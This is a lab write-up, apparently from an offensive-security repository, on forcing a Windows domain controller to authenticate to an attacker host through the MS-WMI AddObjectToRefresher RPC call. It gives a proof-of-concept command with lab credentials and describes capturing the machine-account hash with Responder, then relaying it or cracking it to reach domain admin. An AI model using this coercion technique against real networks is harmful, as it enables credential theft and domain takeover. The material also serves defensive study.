# MS-WMI - Remote call to IWbemRefreshingServices::AddObjectToRefresher (opnum 3)

## Summary

 - **Protocol**: [[MS-WMI]: Windows Management Instrumentation Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c476597d-4c76-47e7-a2a4-a564fe4bf814)

 - **Protocol UUID**: 8bc3f05e-d86b-11d0-a075-00c04fb68820

 - **Protocol version**: 0.0

 - **SMB Named pipe**: ``

 - **Function name**: [`IWbemRefreshingServices::AddObjectToRefresher`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/cf79fb85-e0cb-4778-86de-03da6de4d5d8)

 - **Function operation number**: `3`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-WMI`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c476597d-4c76-47e7-a2a4-a564fe4bf814) protocol (with uuid `8bc3f05e-d86b-11d0-a075-00c04fb68820` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-WMI`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c476597d-4c76-47e7-a2a4-a564fe4bf814) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-WMI]: Windows Management Instrumentation Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c476597d-4c76-47e7-a2a4-a564fe4bf814) and allows to call RPC functions of this protocol. We will then call the remote [`IWbemRefreshingServices::AddObjectToRefresher`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/cf79fb85-e0cb-4778-86de-03da6de4d5d8) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
IWbemRefreshingServices::AddObjectToRefresher('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT AddObjectToRefresher(
   [in] _WBEM_REFRESHER_ID* pRefresherId,
   [in, string] LPCWSTR wszPath,
   [in] long lFlags,
   [in] IWbemContext* pContext,
   [in] DWORD dwClientRefrVersion,
   [out] _WBEM_REFRESH_INFO* pInfo,
   [out] DWORD* pdwSvrRefrVersion
 );
```

## References

 - Documentation of protocol [MS-WMI]: Windows Management Instrumentation Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c476597d-4c76-47e7-a2a4-a564fe4bf814

 - Documentation of function `IWbemRefreshingServices::AddObjectToRefresher`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/cf79fb85-e0cb-4778-86de-03da6de4d5d8